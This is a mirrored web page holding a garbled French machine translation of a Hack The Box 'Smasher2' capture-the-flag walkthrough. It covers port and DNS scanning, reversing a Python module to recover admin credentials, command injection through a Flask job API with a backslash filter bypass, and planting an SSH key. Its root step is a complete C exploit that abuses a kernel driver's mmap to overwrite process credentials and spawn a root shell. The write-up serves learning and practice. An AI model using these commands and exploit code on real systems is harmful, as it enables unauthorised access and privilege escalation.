<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üì∫ ü§òüèª üßìüèª Hack The Box - Smasher2 Proc√©dure pas √† pas Flacon, WAF et LPE via des pilotes pwn üîØ ü§™ üòê</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Dans cet article, je vais commencer √† publier des solutions envoy√©es pour un traitement ult√©rieur √† partir du site HackTheBox . J'esp√®re que cela aide...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Hack The Box - Smasher2 Proc√©dure pas √† pas Flacon, WAF et LPE via des pilotes pwn</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/480454/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/ms/yw/0j/msyw0jxgua25iuntaxj1qcayfuq.png" alt="image"></div><br>  Dans cet article, je vais commencer √† publier des solutions envoy√©es pour <a href="https://www.hackthebox.eu/" rel="nofollow">un traitement ult√©rieur √†</a> partir du site <a href="https://www.hackthebox.eu/" rel="nofollow">HackTheBox</a> .  J'esp√®re que cela aidera au moins quelqu'un √† se d√©velopper dans le domaine de la s√©curit√© de l'information.  Dans cet article, nous allons inverser la biblioth√®que de python, contourner WAF et exploiter la vuln√©rabilit√© mmap. <br><br>  La connexion au laboratoire se fait via VPN.  Il est recommand√© de ne pas se connecter √† partir d'un ordinateur professionnel ou d'un h√¥te o√π les donn√©es importantes pour vous sont disponibles, car vous vous retrouvez sur un r√©seau priv√© avec des personnes qui connaissent quelque chose dans le domaine de la s√©curit√© de l'information :) <br><br><div class="spoiler">  <b class="spoiler_title">Information organisationnelle</b> <div class="spoiler_text">  Surtout pour ceux qui veulent apprendre quelque chose de nouveau et se d√©velopper dans l'un des domaines de l'information et de la s√©curit√© informatique, j'√©crirai et parlerai des cat√©gories suivantes: <br><br><ul><li>  PWN; </li><li>  cryptographie (Crypto); </li><li>  technologies de r√©seau (r√©seau); </li><li>  reverse (Reverse Engineering); </li><li>  st√©ganographie (Stegano); </li><li>  recherche et exploitation des vuln√©rabilit√©s WEB. </li></ul><br>  En plus de cela, je partagerai mon exp√©rience en criminalistique informatique, analyse de logiciels malveillants et micrologiciels, attaques sur les r√©seaux sans fil et les r√©seaux locaux, r√©alisation de pentests et √©criture d'exploits. <br><a name="habracut"></a><br>  Afin que vous puissiez vous renseigner sur les nouveaux articles, logiciels et autres informations, j'ai cr√©√© une <a href="https://t.me/RalfHackerChannel" rel="nofollow">cha√Æne dans Telegram</a> et un <a href="https://t.me/RalfHackerPublicChat" rel="nofollow">groupe pour discuter de tout probl√®me</a> dans le domaine de l'ICD.  Aussi, je consid√©rerai personnellement vos demandes, questions, suggestions et recommandations personnelles <a href="https://t.me/hackerralf8" rel="nofollow">et r√©pondrai √† tout le monde</a> . <br><br>  Toutes les informations sont fournies √† des fins √©ducatives uniquement.  L'auteur de ce document n'assume aucune responsabilit√© pour tout dommage caus√© √† quelqu'un du fait de l'utilisation des connaissances et des m√©thodes obtenues √† la suite de l'√©tude de ce document. <br></div></div><br><h2>  Intelligence </h2><br><h3>  Balayage de port </h3><br>  Cette machine a une adresse IP de 10.10.10.135, que j'ajoute √† / etc / hosts. <br> <code>10.10.10.135 smasher2.htb</code> <br>  Tout d'abord, nous analysons les ports ouverts.  Puisqu'il faut beaucoup de temps pour analyser tous les ports avec nmap, je vais d'abord le faire avec masscan.  Nous analysons tous les ports TCP et UDP √† partir de l'interface tun0 √† une vitesse de 1000 paquets par seconde. <br><br><pre> <code class="bash hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.135 --rate=1000</code> </pre> <br><img src="https://habrastorage.org/webt/ua/l0/kl/ual0klllexxrrkhyehygavfrji8.png" alt="image"><br><br>  L'h√¥te a 3 ports ouverts.  Maintenant, scannez-le avec nmap pour obtenir plus de d√©tails. <br><br><pre> <code class="bash hljs">nmap -A 10.10.10.135 -p22,53,80</code> </pre> <br><img src="https://habrastorage.org/webt/rv/21/y3/rv21y3ntl_dol3qnlgvdhvshdhg.png" alt="image"><br><br>  Nous avons donc SSH, DNS et WEB, qui renvoie le code 403 (Interdit, acc√®s refus√©). <br><br><h3>  DNS </h3><br>  V√©rifions le DNS.  Pour ce faire, utilisez le client h√¥te, avec l'option -l, pour utiliser la demande AXFR pour voir une liste de tous les h√¥tes du domaine. <br><br><pre> <code class="bash hljs">host -l smasher2.htb 10.10.10.135</code> </pre> <br><img src="https://habrastorage.org/webt/3q/st/te/3qstteuzgycf6fxuc_7vxit1rfe.png" alt="image"><br><br>  Par cons√©quent, vous devez ajouter une nouvelle entr√©e dans / etc / hosts. <br> <code>10.10.10.135 wonderfulsessionmanager.smasher2.htb</code> <br> <br><h3>  WEB </h3><br>  Passons maintenant √† voir ce que WEB nous donnera lors de l'acc√®s √† smasher2.htb. <br><br><img src="https://habrastorage.org/webt/9-/li/n5/9-lin58jouqm966oevnsoccso1a.png" alt="image"><br><br>  C'est vide.  Dans ce cas, vous devez trier les r√©pertoires.  J'utilise golang √©crit gobuster rapide.  Nous allons parcourir les r√©pertoires en 128 threads, nous serons int√©ress√©s par les extensions html, php, txt, conf et les codes de r√©ponse 200, 204, 301, 302, 307, 401. <br><br><pre> <code class="bash hljs">gobuster dir -t 128 -u http://smasher2.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,conf -s 200,204,301,302,307,401</code> </pre><br><img src="https://habrastorage.org/webt/iw/du/g9/iwdug9gy9ukr37s9nn4-c7pqojk.png" alt="image"><br><br>  Recherchez le r√©pertoire de sauvegarde.  Nous regardons ce qu'il contient. <br><br><img src="https://habrastorage.org/webt/id/lj/zz/idljzzfub_qbnzzwu2x1lic2l38.png" alt="image"><br><br>  En cons√©quence, t√©l√©chargez le fichier et la biblioth√®que python.  Ensuite, allez sur un autre nom de domaine, et nous y trouvons le formulaire d'autorisation. <br><br><img src="https://habrastorage.org/webt/mu/n0/mp/mun0mpgaqduxfzmhxifnqbq6_gg.png" alt="image"><br><br>  Le plugin Mozilla Firefox Wappalyzer signale les technologies utilis√©es.  Ainsi, le site est √©crit en python 2.7.15. <br><br><img src="https://habrastorage.org/webt/ze/h9/ze/zeh9zeby2o839yeim2osz0-w__i.png" alt="image"><br><br><h2>  API WEB </h2><br><h3>  Python </h3><br>  Nous venons de trouver le fichier auth.py, analysons-le.  Dans la premi√®re ligne de l'importation, nous nous tournons vers le module ses.so, que nous avons √©galement trouv√© dans les sauvegardes. <br><br><img src="https://habrastorage.org/webt/8-/ap/rm/8-aprmznzxtkkd04fzy9wzzrchk.png" alt="image"><br><br>  On retrouve l'authentification dans le code.  En cas d'authentification r√©ussie, nous serons retourn√©s secret_token_info. <br><br><img src="https://habrastorage.org/webt/vn/er/sa/vnersai2zkkcopwujarn-9abz8i.png" alt="image"><br><br><img src="https://habrastorage.org/webt/j2/yp/3e/j2yp3emp8fwuj4xbshedsf7bou0.png" alt="image"><br><br>  Passons au point ¬´/ api // job¬ª.  Les donn√©es sont re√ßues par la m√©thode POST, alors qu'elles doivent √™tre au format JSON.  Si le param√®tre de planification est pr√©sent dans les donn√©es, il est pass√© √† l'ex√©cution en tant que commande sur la ligne de commande. <br><br><img src="https://habrastorage.org/webt/x7/oh/fs/x7ohfsjrcxhr8-tuwqdtcsnjxq8.png" alt="image"><br><br>  Le login et le mot de passe ont √©t√© modifi√©s ... Ils sont transf√©r√©s dans notre biblioth√®que, qui cr√©e une session - l'objet SessionManager. <br><br><img src="https://habrastorage.org/webt/uq/p4/2e/uqp42eqln2alvsfnpwyvjbe5c_q.png" alt="image"><br><br>  La fonction safe_init_manager (id) sera appel√©e √† chaque nouvel appel, en raison de before_request.  Ainsi, une nouvelle session est initialis√©e. <br><br><img src="https://habrastorage.org/webt/95/wv/yu/95wvyudl1crmjq5nv-bq-li7gze.png" alt="image"><br><br>  La fonction login () cr√©e un objet gestionnaire d√©pendant de la session. <br><br><img src="https://habrastorage.org/webt/zi/0t/uh/zi0tuhqdy8ewibq3purmsr6u5_e.png" alt="image"><br><br>  Et la v√©rification est effectu√©e par la m√©thode check_login (). <br><br><img src="https://habrastorage.org/webt/u8/xt/_v/u8xt_vgcczwhkl4cbqlzov7tsio.png" alt="image"><br><br><h3>  Inverser .so </h3><br>  Nous devons donc savoir comment les donn√©es sont v√©rifi√©es.  Pour ce faire, dans la biblioth√®que, nous devons comprendre le p√©riph√©rique SessionManager.check_login ().  Jetez dans IDA Pro, recherchez la fonction souhait√©e. <br><br><img src="https://habrastorage.org/webt/ui/--/y0/ui--y0og5qsjhymyhpozz6kux0u.png" alt="image"><br><br>  En ouvrant la fonction, j'ai attir√© l'attention sur son graphique.  J'√©tais int√©ress√© par un certain nombre de blocs inf√©rieurs, avant de converger. <br><br><img src="https://habrastorage.org/webt/89/1o/7r/891o7r5jjpip6zh2uqba7xzbgrs.png" alt="image"><br><br>  En parcourant les blocs, vous pouvez voir de quoi parle telle ou telle branche de l'ex√©cution de la fonction.  Ainsi, nous n'avons besoin que du bloc le plus √† droite. <br><br><img src="https://habrastorage.org/webt/ve/xq/da/vexqdaz61fubdsfteffkqdx0ngi.png" alt="image"><br><br>  J'ai peint la ligne de comportement de la fonction qui nous int√©resse. <br><br><img src="https://habrastorage.org/webt/9c/k9/ao/9ck9aomluu0wemswvub1salylas.png" alt="image"><br><br>  Voyons maintenant ce qui se passe.  √Ä un endroit, j'ai remarqu√© un code identique pour l'identifiant et le mot de passe.  Et aussi la m√™me comparaison. <br><br><img src="https://habrastorage.org/webt/65/fs/cd/65fscdprft3krxphyiwtbxdq_vg.png" alt="image"><br><br>  De plus, la m√™me fonction est appel√©e pour le login et le mot de passe. <br><br><img src="https://habrastorage.org/webt/jo/um/w3/joumw3woscffqrof2lnjlyajdqs.png" alt="image"><br><br>  Cela sugg√®re que le nom d'utilisateur et le mot de passe sont identiques.  Mais puisque cette valeur vient du programme python et qu'elle a √©t√© √©dit√©e, il ne reste plus qu'√† trier.  J'ai essay√© le nom standard et, √† ma grande surprise, l'administrateur est venu (pourquoi n'ai-je pas essay√© tout de suite ...). <br><br><img src="https://habrastorage.org/webt/xp/9n/at/xp9natep2ikm8wlduicpijksqug.png" alt="image"><br><br><h2>  Point d'entr√©e </h2><br>  Nous avons une cl√©.  Vous devez maintenant collecter la demande pour ex√©cuter le code.  Comme mentionn√© pr√©c√©demment, nous devons envoyer les donn√©es de la m√©thode POST contenant le param√®tre de planification au format JSON √† <a href="http://wonderfulsessionmanager.smasher2.htb/auth/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job" rel="nofollow">wonderfulsessionmanager.smasher2.htb / auth / fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8 / job</a> .  Nous faisons cela avec curl et passons le r√©sultat √† jq.  Nous ex√©cuterons la commande whoami. <br><br><pre> <code class="bash hljs">curl -s -H <span class="hljs-string"><span class="hljs-string">"Cookie: session=eyJpZCI6eyIgYiI6Ik5UaGlZVEJrTmpBMk1qYzBNemN4TmprellUTm1NREV3TXprMk9USTRPV1UzTnpVd05EQXdZZz09In19.XfZcLA.R3UTUnieAARkHBTbqpTmofKWtBw"</span></span> -H <span class="hljs-string"><span class="hljs-string">"Content-Type: application/json"</span></span> http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data <span class="hljs-string"><span class="hljs-string">'{"schedule":"whoami"}'</span></span> | jq</code> </pre> <br><img src="https://habrastorage.org/webt/-s/u0/er/-su0erve1bo3frizq-_qmtlyclq.png" alt="image"><br><br>  Mais lorsque vous essayez d'ex√©cuter la commande ¬´ls¬ª, nous obtenons une erreur. <br><br><img src="https://habrastorage.org/webt/sz/c7/pk/szc7pkucef1xd5errhnrw01ydas.png" alt="image"><br><br>  Il y a tr√®s probablement un filtre sur l'√©quipe.  Envoyons ¬´l \\ s¬ª - avec succ√®s, ce qui indique la pr√©sence d'un filtre. <br><br><img src="https://habrastorage.org/webt/bx/vl/wy/bxvlwyxbspsgt_bsucpjk8gkdda.png" alt="image"><br><br><h2>  UTILISATEUR </h2><br>  Maintenant, nous devons obtenir un shell normal dans le syst√®me.  Le syst√®me ex√©cute SSH, nous pouvons donc g√©n√©rer une cl√© et la pousser dans la liste des h√¥tes autoris√©s. <br><br>  Nous g√©n√©rons d'abord une cl√©. <br><br><img src="https://habrastorage.org/webt/75/nx/-m/75nx-mr9ckmrkoyiwer3tte6qbm.png" alt="image"><br><br>  Maintenant, nous devons transf√©rer notre cl√© publique dans le fichier /home/dzonerzy/.ssh/authorized_keys.  Mais pour faciliter le transfert, nous utiliserons son encodage en base64. <br><br><pre> <code class="bash hljs">base64 -w0 id_rsa.pub</code> </pre> <br>  Nous le transf√©rons d'abord dans un fichier temporaire. <br><br><pre> <code class="bash hljs">ec\\ho \‚Äù=\‚Äù &gt; /tmp/ralf</code> </pre> <br>  Maintenant, d√©codez et √©crivez comme pr√©vu. <br><pre> <code class="bash hljs">ba\\se\\64 -\\d /tmp/ralf &gt;&gt; /home/dzonerzy/\\.\\ss\\h/auth\\orized_ke\\ys</code> </pre> <br>  Nous avons not√© la cl√©, maintenant si tout va bien, nous pouvons nous connecter via SSH en utilisant la cl√© priv√©e.  Nous essayons.  Et nous sommes dans le syst√®me. <br><br><img src="https://habrastorage.org/webt/mf/7t/7n/mf7t7nnau3dbshpiirvblygdrhk.png" alt="image"><br><br><h2>  LPE - ROOT </h2><br><h3>  Annonce </h3><br>  √Ä c√¥t√© du jeton de l'utilisateur se trouve le fichier README.  Lisez-le. <br><br><img src="https://habrastorage.org/webt/n0/io/bi/n0iobindnitc1h69lhemnrnskmw.png" alt="image"><br><br>  On nous dit que nous ne devrions pas penser de mani√®re standard ... Mais apr√®s avoir termin√© les √©num√©rations standard et ne rien trouver, j'ai attir√© l'attention sur le groupe dans lequel se trouve l'utilisateur. <br><br><img src="https://habrastorage.org/webt/ko/rc/9u/korc9u_5ji78nds_jgcnelql_uq.png" alt="image"><br><br>  Le groupe adm a acc√®s √† des fichiers int√©ressants. <br><br><img src="https://habrastorage.org/webt/dp/oj/c0/dpojc0lhn1tpdzsgcp0k11vtyec.png" alt="image"><br><br>  Par exemple, auth.log.  Il refl√®te non seulement les faits de l'autorisation r√©ussie et infructueuse, mais √©galement les faits de l'utilisation de la commande sudo. <br><br><pre> <code class="bash hljs">strings /var/<span class="hljs-built_in"><span class="hljs-built_in">log</span></span>/auth.log | grep sudo</code> </pre> <br><img src="https://habrastorage.org/webt/8t/a6/r7/8ta6r7a-rgji8-ruimkshuc-2to.png" alt="image"><br><br>  Une commande int√©ressante est ex√©cut√©e au nom de la racine.  Mais il est connect√© au pilote, vous devez donc vous assurer que nous suivons le chemin. <br><br><img src="https://habrastorage.org/webt/ix/1i/gx/ix1igxiggwoaugz01xkwu81ftbe.png" alt="image"><br><br>  Oui, malheureusement, tout revient au chauffeur. <br><br><h3>  Chauffeur </h3><br>  Comme il s'agit d'un pilote (module noyau), nous obtiendrons des informations √† ce sujet en utilisant modinfo. <br><br><img src="https://habrastorage.org/webt/ek/bh/1v/ekbh1vr8tpqrjysaqtkuu3ogwsk.png" alt="image"><br><br>  Il est dit que le pilote est n√©cessaire pour travailler avec le p√©riph√©rique dhid.  V√©rifiez-le. <br><br><img src="https://habrastorage.org/webt/ck/bv/zx/ckbvzxss6iz1ughsn_lhqflutw4.png" alt="image"><br><br>  Oui  Il existe un tel appareil.  Afin d'√©tudier le pilote, je l'ai copi√© moi-m√™me et t√©l√©charg√© dans IDA Pro. <br><br><pre> <code class="bash hljs">scp -i id_rsa dzonerzy@10.10.10.135:/lib/modules/4.15.0-45-generic/kernel/drivers/hid/dhid.ko ./</code> </pre> <br>  Une liste restreinte de fonctions, dont pour PWN nous nous int√©ressons √† celles qui fonctionnent avec la m√©moire.  A en juger par les noms, ce sont dev_read et dev_mmap. <br><br><img src="https://habrastorage.org/webt/g9/k9/5s/g9k95slhxhlihqi0nhwm3ei5qxk.png" alt="image"><br><br>  Plus loin sur Google, je n'ai pas trouv√© particuli√®rement d'informations sur la vuln√©rabilit√© des pilotes li√©e √† la lecture, ce qui ne peut pas √™tre dit sur mmap!  Alors je suis all√© vers elle. <br><br><img src="https://habrastorage.org/webt/3v/rk/7x/3vrk7xh2hcwclirw59wcdzihxxe.png" alt="image"><br><br>  En g√©n√©ral, mmap dans les pilotes est n√©cessaire pour mapper l'appareil √† la m√©moire et s√©lectionner les pages √† la demande, car initialement l'appareil n'utilise pas du tout de m√©moire physique. <br><br>  Dans ce code, le seul endroit int√©ressant est l'appel √† la fonction remap_pfn_range, qui permet un mappage lin√©aire de la m√©moire de l'appareil sur l'espace d'adressage de l'utilisateur. <br><blockquote>  int remap_pfn_range (struct vm_area_struct * vma, unsigned long virt_add, unsigned long pfn, unsigned long size, pgprot_t prot); <br><br>  Affiche les octets de taille des adresses physiques, en commen√ßant par le num√©ro de page sp√©cifi√© par pfn pour l'adresse virtuelle virt_add.  Les bits de s√©curit√© associ√©s √† l'espace virtuel sont sp√©cifi√©s dans prot. </blockquote><br>  Comme d'habitude, nous examinons des param√®tres qui n'ont pas √©t√© trait√©s auparavant.  Ce sont les param√®tres pfn et size, qui nous permettent d'afficher n'importe quelle quantit√© de m√©moire pour la lecture et l'√©criture. <br><br><h3>  Exploiter </h3><br>  Googler ce qui peut √™tre fait √† ce sujet, j'ai √©t√© frapp√© par un mode d'exploitation possible.  Si nous pouvons trouver la structure de contr√¥le de creds en m√©moire, cela nous permettra de changer l'uid utilisateur √† 0. Et ensuite appeler le shell, ce qui nous donnera un shell avec tous les privil√®ges. <br><br><img src="https://habrastorage.org/webt/of/os/r5/ofosr5umezutxzuvasy8xd-_cqg.png" alt="image"><br><br>  Tout d'abord, v√©rifiez si nous pouvons afficher une grande quantit√© de m√©moire.  Le code suivant ouvrira le p√©riph√©rique et affichera 0xf0000000 octets √† partir de l'adresse 0x40404040 pour la lecture et l'√©criture avec la possibilit√© d'utiliser cette r√©flexion avec d'autres processus qui refl√®tent le m√™me objet. <br><br><div class="spoiler">  <b class="spoiler_title">code</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/mman.h&gt; int main(int argc, char * const * argv){ printf("pid: %d\n", getpid()); int fd = open("/dev/dhid", O_RDWR); printf("fd: %d\n", fd); unsigned long size = 0xf0000000; unsigned long start_mmap = 0x40404000; unsigned int * addr = (unsigned int *)mmap((void*)start_mmap, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0); printf("mmap address: %lx\n", addr); int stop = getchar(); return 0; }</span></span></span></span></code> </pre> <br></div></div><br>  Compiler: <code>gcc sh.c -o sh.bin</code> et transf√©rer vers l'h√¥te.  Lan√ßons-le. <br><br><img src="https://habrastorage.org/webt/vh/d2/u3/vhd2u3vjza59bcxi69drrpwoc9a.png" alt="image"><br><br>  Passons maintenant √† un autre terminal ssh et regardons la carte m√©moire de ce processus. <br><br><img src="https://habrastorage.org/webt/6u/mp/v4/6umpv4dzghjv0y1u2lyyy6lad7g.png" alt="image"><br><br>  Comme vous pouvez le constater, l'adresse est la m√™me, des √©tiquettes de lecture et d'√©criture, ainsi que de partage sont appos√©es.  C'est une id√©e qui marche.  L'√©tape suivante consiste √† trouver la structure des cr√©dits du processus √† l'esprit.  On peut voir dans la structure ci-dessus que le poin√ßon sera 8 num√©ros bless√©s par notre uid, qui vont de suite. <br><br><div class="spoiler">  <b class="spoiler_title">code</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/mman.h&gt; int main(int argc, char * const * argv){ printf("pid: %d\n", getpid()); int fd = open("/dev/dhid", O_RDWR); printf("fd: %d\n", fd); unsigned long size = 0xf0000000; unsigned long start_mmap = 0x40404000; unsigned int * addr = (unsigned int *)mmap((void*)start_mmap, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0); printf("mmap address: %lx\n", addr); unsigned int uid = getuid(); unsigned int cred_cur = 0; unsigned int cred_iter = 0; while (((unsigned long)addr) &lt; (start_mmap + size - 0x40)){ cred_cur = 0; if( addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid ){ cred_iter++; printf("found struct... ptr: %p, cred_iter: %d\n", addr, cred_iter); } addr++; } fflush(stdout); int stop = getchar(); return 0; }</span></span></span></span></code> </pre> <br></div></div><br>  Ainsi, nous avons trouv√© 19 structures similaires. <br><br><img src="https://habrastorage.org/webt/rj/j5/pl/rjj5plsfirobcfwqzc8vss-svtc.png" alt="image"><br><br>  Maintenant, nous devons r√©√©crire tous les uid √† 0. Apr√®s avoir r√©√©crit les uid d'une certaine structure, nous allons v√©rifier notre uid.  D√®s que notre uid devient √©gal √† 0, nous pouvons supposer que nous avons trouv√© des creds la structure du processus dont nous avons besoin. <br><br><div class="spoiler">  <b class="spoiler_title">code</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/mman.h&gt; int main(int argc, char * const * argv){ printf("pid: %d\n", getpid()); int fd = open("/dev/dhid", O_RDWR); printf("fd: %d\n", fd); unsigned long size = 0xf0000000; unsigned long start_mmap = 0x40404000; unsigned int * addr = (unsigned int *)mmap((void*)start_mmap, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0); printf("mmap address: %lx\n", addr); unsigned int uid = getuid(); unsigned int cred_cur = 0; unsigned int cred_iter = 0; while (((unsigned long)addr) &lt; (start_mmap + size - 0x40)){ cred_cur = 0; if( addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid ){ cred_iter++; printf("found struct... ptr: %p, crednum: %d\n", addr, cred_iter); cred_cur = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; if (getuid() == 0){ printf("found current struct... ptr: %p, crednum: %d\n", addr, cred_iter); break; } else{ cred_cur = 0; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; } } addr++; } fflush(stdout); int stop = getchar(); return 0; }</span></span></span></span></code> </pre> <br></div></div><br><img src="https://habrastorage.org/webt/1x/62/eq/1x62eqetpojbwrrimgaguepynb4.png" alt="image"><br><br>  Maintenant, apr√®s avoir trouv√© la structure dont nous avons besoin, nous allons changer l'uid en 0xffffffff et appeler le shell bash via la fonction exec. <br><br><div class="spoiler">  <b class="spoiler_title">code</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/mman.h&gt; int main(int argc, char * const * argv){ printf("pid: %d\n", getpid()); int fd = open("/dev/dhid", O_RDWR); printf("fd: %d\n", fd); unsigned long size = 0xf0000000; unsigned long start_mmap = 0x40404000; unsigned int * addr = (unsigned int *)mmap((void*)start_mmap, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0); printf("mmap address: %lx\n", addr); unsigned int uid = getuid(); unsigned int cred_cur = 0; unsigned int cred_iter = 0; while (((unsigned long)addr) &lt; (start_mmap + size - 0x40)){ cred_cur = 0; if( addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid ){ cred_iter++; printf("found struct... ptr: %p, crednum: %d\n", addr, cred_iter); cred_cur = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; if (getuid() == 0){ printf("found current struct... ptr: %p, crednum: %d\n", addr, cred_iter); cred_cur += 1; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; execl("/bin/sh","-", (char *)NULL); break; } else{ cred_cur = 0; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; } } addr++; } fflush(stdout); int stop = getchar(); return 0; }</span></span></span></span></code> </pre> <br></div></div><br><img src="https://habrastorage.org/webt/mn/zl/xq/mnzlxqz8pj4qafv_w0jznrhb0_e.png" alt="image"><br><br>  Nous avons pris racine.  En fait, il s'agit d'une machine tr√®s complexe qui n√©cessitait une sophistication pour g√©rer cette version de LPE. <br><br>  Bien s√ªr, il a √©t√© tr√®s difficile d'obtenir l'exploit de la vuln√©rabilit√© dans le pilote, et je suis reconnaissant √† la communaut√© qui m'a aid√© avec un indice sur la fa√ßon d'acc√©der au pilote et a partag√© un article sur l'exploitation similaire de la vuln√©rabilit√© dans mmap. <br><br>  Dois-je continuer √† publier l'analyse des machines envoy√©es pour un traitement ult√©rieur?  Vous pouvez nous rejoindre sur <a href="https://t.me/RalfHackerChannel" rel="nofollow">Telegram</a> .  Cr√©ons une communaut√© dans laquelle il y aura des gens qui connaissent bien de nombreux domaines de l'informatique, puis nous pouvons toujours nous entraider pour tout probl√®me informatique et de s√©curit√© de l'information. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr480454/">https://habr.com/ru/post/fr480454/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
